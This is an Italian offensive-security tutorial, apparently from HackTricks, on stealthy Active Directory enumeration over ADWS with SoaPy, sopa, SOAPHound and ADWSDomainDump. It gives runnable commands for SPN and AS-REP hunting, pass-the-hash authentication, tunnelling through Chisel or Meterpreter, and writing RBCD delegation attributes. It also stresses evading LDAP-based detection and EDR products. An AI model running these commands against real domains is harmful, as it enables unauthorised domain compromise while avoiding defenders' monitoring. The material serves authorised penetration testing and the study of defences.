# Enumerazione di Active Directory Web Services (ADWS) e raccolta stealth

{{#include ../../banners/hacktricks-training.md}}

## Che cos'è ADWS?

Active Directory Web Services (ADWS) è **abilitato per impostazione predefinita su ogni Domain Controller a partire da Windows Server 2008 R2** e ascolta sulla porta TCP **9389**.  Nonostante il nome, **non viene utilizzato alcun protocollo HTTP**.  Il servizio espone invece dati in stile LDAP attraverso uno stack di protocolli proprietari di framing .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Poiché il traffico è incapsulato all'interno di questi frame SOAP binari e viaggia su una porta non comune, **l'enumeration tramite ADWS ha molte meno probabilità di essere ispezionata, filtrata o identificata tramite signature rispetto al traffico LDAP/389 e 636 classico**.  Per gli operatori questo significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon più stealth: i Blue Team spesso si concentrano sulle query LDAP.
* Libertà di raccogliere dati da **host non-Windows (Linux, macOS)** effettuando il tunnelling di 9389/TCP attraverso un proxy SOCKS.
* Gli stessi dati che si otterrebbero tramite LDAP (utenti, gruppi, ACL, schema, ecc.) e la possibilità di eseguire **write** (ad esempio `msDs-AllowedToActOnBehalfOfOtherIdentity` per **RBCD**).

Le interazioni ADWS sono implementate tramite WS-Enumeration: ogni query inizia con un messaggio `Enumerate` che definisce il filtro/gli attributi LDAP e restituisce un GUID `EnumerationContext`, seguito da uno o più messaggi `Pull` che trasmettono i risultati fino alla finestra dei risultati definita dal server.<sup>[[7]](#references)</sup> I context scadono dopo circa 30 minuti, quindi i tool devono suddividere i risultati in pagine oppure separare i filtri (query con prefisso per CN) per evitare di perdere lo stato.<sup>[[8]](#references)</sup> Quando si richiedono security descriptor, specificare il controllo `LDAP_SERVER_SD_FLAGS_OID` per omettere le SACL; in caso contrario ADWS rimuove semplicemente l'attributo `nTSecurityDescriptor` dalla propria risposta SOAP.

> NOTA: ADWS viene utilizzato anche da molti tool RSAT GUI/PowerShell, quindi il traffico può confondersi con attività amministrative legittime.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) è una **re-implementazione completa dello stack del protocollo ADWS in puro Python**.  Costruisce i frame NBFX/NBFSE/NNS/NMF byte per byte, consentendo la raccolta da sistemi Unix-like senza utilizzare il runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Funzionalità principali

* Supporta il **proxying tramite SOCKS** (utile dagli impianti C2).
* Filtri di ricerca dettagliati identici a LDAP `-q '(objectClass=user)'`.
* Operazioni **write** opzionali ( `--set` / `--delete` ).
* Modalità di output **BOFHound** per l'ingestion diretta in BloodHound.<sup>[[3]](#references)</sup>
* Flag `--parse` per rendere più leggibili timestamp / `userAccountControl` quando è richiesta la leggibilità umana.<sup>[[2]](#references)</sup>

### Flag per la raccolta mirata e operazioni write

SoaPy include switch predisposti che replicano le attività LDAP hunting più comuni tramite ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oltre ai parametri `--query` / `--filter` raw per pull personalizzati. È possibile combinarli con primitive write come `--rbcd <source>` (imposta `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (staging di SPN per Kerberoasting mirato) e `--asrep` (imposta `DONT_REQ_PREAUTH` in `userAccountControl`).<sup>[[2]](#references)</sup>

Esempio di SPN hunt mirato che restituisce solo `samAccountName` e `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Usa lo stesso host/credenziali per weaponise immediatamente i findings: esegui il dump degli oggetti compatibili con RBCD con `--rbcds`, quindi applica `--rbcd 'WEBSRV01$' --account 'FILE01$'` per predisporre una catena di Resource-Based Constrained Delegation (consulta [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) per il percorso completo di abuso).

### Installazione (host dell'operatore)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork di `ldapdomaindump` che sostituisce le query LDAP con chiamate ADWS sulla porta TCP/9389 per ridurre i rilevamenti delle firme LDAP.
* Esegue un controllo iniziale della raggiungibilità della porta 9389, a meno che non venga passato `--force` (salta il probe se le port scan sono rumorose o filtrate).
* Testato con Microsoft Defender for Endpoint e CrowdStrike Falcon, con bypass riuscito nel README.<sup>[[4]](#references)</sup>

### Installazione
```bash
pipx install .
```
### Utilizzo
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
L'output tipico registra la verifica della raggiungibilità sulla porta 9389, il bind ADWS e l'inizio/la fine del dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Un client pratico per ADWS in Golang

Analogamente a soapy, [sopa](https://github.com/Macmod/sopa) implementa lo stack del protocollo ADWS (MS-NNS + MC-NMF + SOAP) in Golang, esponendo flag da riga di comando per eseguire chiamate ADWS come:<sup>[[5]](#references)</sup>

* **Ricerca e recupero degli oggetti** - `query` / `get`
* **Ciclo di vita degli oggetti** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Modifica degli attributi** - `attr [add|replace|delete]`
* **Gestione degli account** - `set-password` / `change-password`
* e altri come `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ecc.

### Punti salienti della mappatura del protocollo

* Le ricerche in stile LDAP vengono eseguite tramite **WS-Enumeration** (`Enumerate` + `Pull`) con proiezione degli attributi, controllo dell'ambito (Base/OneLevel/Subtree) e paginazione.
* Il recupero di un singolo oggetto utilizza **WS-Transfer** `Get`; le modifiche agli attributi usano `Put`; le eliminazioni usano `Delete`.
* La creazione integrata degli oggetti utilizza **WS-Transfer ResourceFactory**; gli oggetti custom usano un **IMDA AddRequest** basato su template YAML.
* Le operazioni sulle password sono azioni **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Individuazione dei metadati non autenticata (mex)

ADWS espone WS-MetadataExchange senza credenziali, offrendo un modo rapido per verificare l'esposizione prima dell'autenticazione:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Note sulla discovery DNS/DC e sul targeting Kerberos

Sopa può risolvere i DC tramite SRV se `--dc` viene omesso e viene fornito `--domain`. Esegue le query in quest'ordine e usa il target con la priorità più alta:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operativamente, preferisci un resolver controllato dal DC per evitare errori negli ambienti segmentati:

* Usa `--dns <DC-IP>` in modo che **tutte** le lookup SRV/PTR/forward passino attraverso il DNS del DC.
* Usa `--dns-tcp` quando UDP è bloccato o le risposte SRV sono di grandi dimensioni.
* Se Kerberos è abilitato e `--dc` è un IP, sopa esegue un **reverse PTR** per ottenere un FQDN e indirizzare correttamente SPN/KDC. Se Kerberos non viene utilizzato, non viene eseguita alcuna lookup PTR.

Esempio (IP + Kerberos, DNS forzato tramite il DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opzioni del materiale di autenticazione

Oltre alle password in chiaro, sopa supporta **NT hashes**, **Kerberos AES keys**, **ccache** e **PKINIT certificates** (PFX o PEM) per l'autenticazione ADWS. Kerberos è implicito quando si usa `--aes-key`, `-c` (ccache) o opzioni basate su certificati.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Creazione di oggetti personalizzati tramite template

Per classi di oggetti arbitrarie, il comando `create custom` utilizza un template YAML che corrisponde a una `AddRequest` IMDA:<sup>[[5]](#references)</sup>

* `parentDN` e `rdn` definiscono il container e il DN relativo.
* `attributes[].name` supporta `cn` o `addata:cn` con namespace.
* `attributes[].type` accetta `string|int|bool|base64|hex` o valori `xsd:*` espliciti.
* **Non** includere `ad:relativeDistinguishedName` o `ad:container-hierarchy-parent`; sopa li inserisce automaticamente.
* I valori `hex` vengono convertiti in `xsd:base64Binary`; usa `value: ""` per impostare stringhe vuote.

## SOAPHound – Raccolta ADWS ad alto volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) è un collector .NET che mantiene tutte le interazioni LDAP all'interno di ADWS ed emette JSON compatibili con BloodHound v4. Costruisce una cache completa di `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` una sola volta (`--buildcache`), quindi la riutilizza per le operazioni ad alto volume `--bhdump`, `--certdump` (ADCS) o `--dnsdump` (DNS integrato in AD), in modo che dal DC escano soltanto circa 35 attributi critici. AutoSplit (`--autosplit --threshold <N>`) suddivide automaticamente le query in base al prefisso CN per rimanere al di sotto del timeout di 30 minuti di EnumerationContext nei forest di grandi dimensioni.<sup>[[8]](#references)</sup>

Flusso di lavoro tipico su una VM dell'operatore aggiunta al dominio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON esportati direttamente nei workflow di SharpHound/BloodHound: consulta la [metodologia BloodHound](bloodhound.md) per idee sulla rappresentazione nei grafi downstream. AutoSplit rende SOAPHound resiliente nelle foreste con milioni di oggetti, mantenendo al contempo più basso il numero di query rispetto agli snapshot in stile ADExplorer.

## Workflow di raccolta AD stealth

Il seguente workflow mostra come enumerare **oggetti di dominio e ADCS** tramite ADWS, convertirli in JSON di BloodHound e cercare attack path basati sui certificati, il tutto da Linux:

1. **Crea un tunnel per 9389/TCP** dalla rete target al tuo computer (ad esempio tramite Chisel, Meterpreter, port-forwarding dinamico SSH, ecc.). Esporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` oppure usa `--proxyHost/--proxyPort` di SoaPy.

2. **Raccogli l'oggetto del dominio root:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Raccogli gli oggetti relativi ad ADCS dal Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converti in BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Carica lo ZIP** nella GUI di BloodHound ed esegui query cypher come `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` per rivelare i percorsi di escalation tramite certificati (ESC1, ESC8, ecc.).

### Scrittura di `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combina questo con `s4u2proxy`/`Rubeus /getticket` per una catena completa di **Resource-Based Constrained Delegation** (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Riepilogo degli strumenti

| Scopo | Strumento | Note |
|---------|------|-------|
| Enumerazione ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lettura/scrittura |
| Dump ADWS ad alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modalità BH/ADCS/DNS |
| Ingestione in BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte i log di SoaPy/ldapsearch |
| Compromissione dei certificati | [Certipy](https://github.com/ly4k/Certipy) | Può essere sottoposto a proxy tramite lo stesso SOCKS |
| Enumerazione ADWS e modifiche agli oggetti | [sopa](https://github.com/Macmod/sopa) | Client generico per interfacciarsi con endpoint ADWS noti - consente enumerazione, creazione di oggetti, modifiche degli attributi e modifiche delle password |

## References

- [1] [SpecterOps – Assicurati di usare SOAP(y) – Una guida per gli operatori alla raccolta stealth di dati AD tramite ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy su GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound su GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump su GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa su GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – specifiche MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumerazione stealth degli ambienti Active Directory tramite ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Strumento SOAPHound per raccogliere dati di Active Directory tramite ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
